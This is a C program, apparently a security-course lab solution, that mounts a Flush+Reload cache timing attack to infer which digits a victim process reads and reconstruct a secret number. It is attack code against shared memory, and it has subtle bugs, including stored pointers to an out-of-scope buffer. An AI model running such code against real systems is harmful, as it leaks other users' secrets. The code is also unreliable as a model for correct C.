#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include "time.h"
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>

#include "probe.h"

#define TIME_LOOP_THRESHOLD (200) 		// Time for capturing image numebrs, in Microseconds

void task_3a(){
	int i;
    int LOOPFOREVER = 1;
    
    // Determine detection threshold
    int DETECTION_THRESHOLD ;
    
    int numbers_size = 11; // numbers variable indexes to check
        
    // Perform actual flush and reload on numbers variable
    const void *numbers_addr;
    uint64_t access_time;
    int number_detected_array[numbers_size];
    int access_detected;

    DETECTION_THRESHOLD = determing_tsc_threshold();

    while(LOOPFOREVER)
    {
            for (i = 0; i < numbers_size; ++i)
            {
                numbers_addr = numbers[i+1];
                access_time = flush_and_reload(numbers_addr);
                // printf("Access time for [%d]: [%lu] Detection threshold: [%d] \n", i, access_time, DETECTION_THRESHOLD);

                if(access_time < DETECTION_THRESHOLD){
                    number_detected_array[i] = 1;
                    access_detected = 1;
                }
                else {
                    number_detected_array[i] = 0;
                }
            }
            // Section to print in format "Access: [1] [2]"
            if(access_detected)
            {
                printf("Access: ");
            }

            for (i = 0; i < numbers_size; ++i)// Print detected numbers
            {
                if(number_detected_array[i])
                {
                    printf("[%d] ", i);
                }

                number_detected_array[i] = 0;// Reset for next iteration
            }

            if(access_detected)// Print line break only if something was printed above
            {
                printf("\n");
            }

            access_detected = 0;// Reset for next iteration
    }
}

int exit_loop=0;
 
void set_loop_exit(int alrm_sig)
{
    exit_loop=1;
}

char * task_3b(int monitor_duration){

    // int guessed_number = -1;

    // Using signal and alarm method to run loop for given seconds
    signal(SIGALRM, set_loop_exit);
    
    // Raising alarm after given time will trigger loop breaker flag
    alarm(monitor_duration);    
    
	uint64_t pr_i_time;
	int to_be_printed=0;
	int to_be_printed_elems[50];
	int strs_captured=0;
	char *strings_captured[50];
	char snum[50];
	struct timespec start, end;
	uint64_t delta_us;
	int time_flag=1;
	int tsc_threshold;
	tsc_threshold = determing_tsc_threshold();

    while(exit_loop==0)
    {   
		clock_gettime(CLOCK_MONOTONIC_RAW, &start);

		while(time_flag){
			for(int i=1; i<11; i++){
				pr_i_time = reload(numbers[i]);
				if(pr_i_time < tsc_threshold){
					to_be_printed++;
					to_be_printed_elems[to_be_printed-1] =i-1;
				}
				flush(numbers[i]);
			}
			clock_gettime(CLOCK_MONOTONIC_RAW, &end);
			delta_us = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_nsec - start.tv_nsec) / 1000; //microseconds
			if(delta_us>TIME_LOOP_THRESHOLD){
				time_flag=0;
			}
		}
		if(to_be_printed!=0){
					strs_captured++;
					char tmp[50]="";
					printf("Access:\t");
					for(int i=0; i<to_be_printed;i++){
						printf("[%d],  ", to_be_printed_elems[i]);
						sprintf(snum, "%d",to_be_printed_elems[i]);
						strcat(tmp, snum);
						}
						printf("\n");
					strings_captured[strs_captured-1]=tmp;
		}
		to_be_printed=0;
		memset(to_be_printed_elems, 0, sizeof(to_be_printed_elems));
		time_flag=1;
    }
    char *biggest_string="";
    for(int i=0;i<strs_captured;i++){
    	if( strlen(strings_captured[i]) > strlen(biggest_string)){
    		printf("%ld\n",strlen(strings_captured[i]));
    		biggest_string = strings_captured[i];
    	}
    }

    return biggest_string;
}


int main(int argc, char *argv[]) {

    if(argc<=1) 
    { 
        task_3a();

    }else
    {
        // Getting the integer value passed by command line
        char *arg = argv[1];
        int monitor_duration = atoi(arg);
        char *guessed_number;

        printf("Running for %d seconds..\n", monitor_duration);

        guessed_number = task_3b(monitor_duration);

        printf("%s\n", guessed_number);

        // if (guessed_number > 0)
        // {
        //     printf("Guessed Number is [%d] \n", guessed_number);
        // }else
        // {
        //     printf("Failed to guess number!\n");
        // }

        
    }

}
